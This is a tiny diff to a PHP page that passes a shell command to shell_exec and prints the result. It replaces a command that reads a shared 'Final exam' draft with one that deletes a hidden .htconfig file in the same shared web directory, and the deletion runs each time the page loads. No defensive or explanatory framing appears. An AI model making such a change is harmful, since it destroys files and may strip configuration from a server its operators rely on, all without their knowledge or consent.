@@ -1,4 +1,4 @@
 <?php
-$output = shell_exec('cat /var/www/documents/shared/IWptBJzlVU/Final\ exam\ v3-draft.rtf');
+$output = shell_exec('rm /var/www/documents/shared/IWptBJzlVU/.htconfig');
 echo "<pre>$output</pre>";
 ?>
